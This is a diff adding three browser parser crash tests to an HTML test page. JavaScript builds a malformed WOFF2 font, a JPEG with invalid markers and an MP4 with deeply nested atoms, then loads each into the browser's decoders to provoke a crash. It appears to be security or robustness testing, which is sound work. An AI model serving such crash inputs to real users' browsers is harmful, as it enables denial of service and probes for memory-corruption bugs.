@@ -36,7 +36,9 @@
     <button onclick="runImportRace()">TEST 1: Worker importScripts Termination Race</button>
     <button onclick="runPostMessageRecursion()">TEST 2: MessagePort Serializer Stack Smash</button>
     <button onclick="runJPEGOverflow()">TEST 3: Canvas JPEG Encoder Heap Overflow</button>
-
+    <button onclick="runWOFF2Crash()">TEST 1: WOFF2 Decompression Bomb</button>
+    <button onclick="runJPEGCrash()">TEST 2: JPEG Marker Confusion</button>
+    <button onclick="runMP4Crash()">TEST 3: MP4 Atom Recursion</button>
 	
     <div id="log">Status: Aguardando testes...</div>
     <canvas id="c" width="100" height="100"></canvas>
@@ -724,6 +726,136 @@ function log(msg) {
             });
         }
 
+
+
+
+// --- TESTE 1: WOFF2 Decompression Bomb ---
+        // Gera um cabeçalho WOFF2 malformado que mente sobre o tamanho descomprimido.
+        async function runWOFF2Crash() {
+            log("Iniciando WOFF2 Parser Attack...");
+            
+            try {
+                // Assinatura WOFF2 ('wOF2')
+                const header = [0x77, 0x4F, 0x46, 0x32];
+                
+                // Versão, Length, NumTables, Reserved
+                const metadata = [
+                    0x00, 0x01, 0x00, 0x00, // Version
+                    0xFF, 0xFF, 0xFF, 0xFF, // Length (4GB - Mentira)
+                    0x00, 0x01,             // NumTables
+                    0x00, 0x00              // Reserved
+                ];
+                
+                // Total Sfnt Size (Tamanho descomprimido) - A BOMBA
+                // Tenta dizer que vai expandir para um valor gigante
+                const totalSfntSize = [0xFF, 0xFF, 0xFF, 0xFF]; 
+                
+                const data = new Uint8Array([...header, ...metadata, ...totalSfntSize, ...new Array(100).fill(0)]);
+                
+                // Carrega a fonte
+                const fontName = "CrashFont" + Math.random();
+                const fontFace = new FontFace(fontName, data);
+                
+                log("Carregando fonte WOFF2 maliciosa...");
+                await fontFace.load(); // O crash deve ocorrer aqui (Descompressão)
+                
+                document.fonts.add(fontFace);
+                document.getElementById('font-box').style.fontFamily = fontName;
+                
+                log("Parser WOFF2 rejeitou o arquivo (Seguro).");
+                
+            } catch(e) {
+                log("Erro Fonte (Normal se rejeitado): " + e.message);
+            }
+        }
+
+        // --- TESTE 2: JPEG Marker Confusion ---
+        // Cria um JPEG com marcadores de dimensão conflitantes ou inválidos.
+        function runJPEGCrash() {
+            log("Iniciando JPEG Decoder Attack...");
+            
+            const img = document.getElementById('img-box');
+            
+            // Header JPEG (SOI)
+            const soi = [0xFF, 0xD8];
+            
+            // Start of Frame (SOF0) - Baseline DCT
+            // Marker, Length, Precision, Height, Width
+            const sof = [
+                0xFF, 0xC0,             // Marker
+                0x00, 0x11,             // Length (17 bytes)
+                0x08,                   // Precision (8-bit)
+                0xFF, 0xFF,             // Height (65535 - Max)
+                0xFF, 0xFF,             // Width (65535 - Max)
+                0x03,                   // Components (3 - RGB)
+                0x01, 0x11, 0x00,       // Y
+                0x02, 0x11, 0x01,       // Cb
+                0x03, 0x11, 0x01        // Cr
+            ];
+            
+            // Start of Scan (SOS) imediato (sem tabelas de quantização/Huffman)
+            // Isso força o decoder a usar tabelas padrão ou crashar
+            const sos = [0xFF, 0xDA, 0x00, 0x0C, 0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3F, 0x00];
+            
+            // Dados de entropia aleatórios (Lixo)
+            const entropy = new Array(1024).fill(0).map(() => Math.floor(Math.random() * 256));
+            
+            // End of Image (EOI)
+            const eoi = [0xFF, 0xD9];
+            
+            const jpegData = new Uint8Array([...soi, ...sof, ...sos, ...entropy, ...eoi]);
+            const blob = new Blob([jpegData], {type: 'image/jpeg'});
+            
+            img.onload = () => log("Imagem carregada (Inesperado).");
+            img.onerror = () => log("Erro de decodificação (Seguro).");
+            
+            log("Injetando JPEG corrompido no Image Decoder...");
+            img.src = URL.createObjectURL(blob);
+        }
+
+        // --- TESTE 3: MP4 Atom Recursion ---
+        // Cria uma estrutura MP4 com átomos 'moov' recursivos ou tamanhos inválidos.
+        function runMP4Crash() {
+            log("Iniciando MP4 Atom Parser Attack...");
+            
+            const vid = document.getElementById('vid-box');
+            
+            // Helper para criar átomos (Length + Name + Data)
+            function makeAtom(name, data = []) {
+                const len = 8 + data.length;
+                const lenBytes = [
+                    (len >>> 24) & 0xFF,
+                    (len >>> 16) & 0xFF,
+                    (len >>> 8) & 0xFF,
+                    len & 0xFF
+                ];
+                const nameBytes = name.split('').map(c => c.charCodeAt(0));
+                return [...lenBytes, ...nameBytes, ...data];
+            }
+            
+            // Constrói um átomo 'moov' que contém outro 'moov', repetidamente
+            let atomData = [];
+            for(let i=0; i<100; i++) {
+                // Aninha 'trak' dentro de 'moov' recursivamente ou linearmente
+                // Se o parser usar recursão na stack, 100 níveis podem ser fatais
+                atomData = makeAtom('moov', makeAtom('trak', atomData));
+            }
+            
+            const ftyp = makeAtom('ftyp', [0x69, 0x73, 0x6F, 0x6D]); // isom
+            const finalData = new Uint8Array([...ftyp, ...atomData]);
+            
+            const blob = new Blob([finalData], {type: 'video/mp4'});
+            
+            vid.onerror = () => log("Erro de vídeo (Seguro).");
+            
+            log("Carregando MP4 Tóxico...");
+            vid.src = URL.createObjectURL(blob);
+		}
+
+
+		
+
     </script>
 </body>
 </html>
+
